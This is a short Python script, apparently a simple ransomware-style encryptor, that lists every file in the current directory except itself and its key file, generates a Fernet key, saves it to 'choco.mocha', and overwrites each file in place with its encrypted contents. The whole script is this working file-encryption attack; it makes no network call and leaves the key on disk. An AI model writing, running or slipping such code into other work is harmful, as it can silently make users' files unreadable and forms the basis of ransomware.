import os

from cryptography.fernet import Fernet
# key
# file = open("choco.mocha", "x")

files = []

# cwd stands for Current Working Directory // .listdir()
for file in os.listdir():
    if file == "mocha.py" or file == "choco.mocha":
        continue
    else: files.append(file)

print(files)

# Encryption key!
key = Fernet.generate_key()

# File containing decryption key
mocha = open("choco.mocha", "x")
with open("choco.mocha", "wb") as mochaContent:
    mochaContent.write(key)

# Write encrypted text to file
for file in files:
    with open(file, "rb") as openedFile:
        # Gets all data from file
        contents = openedFile.read()
    encrypt = Fernet(key).encrypt(contents)
    with open(file, "wb") as writeFile:
        writeFile.write(encrypt)
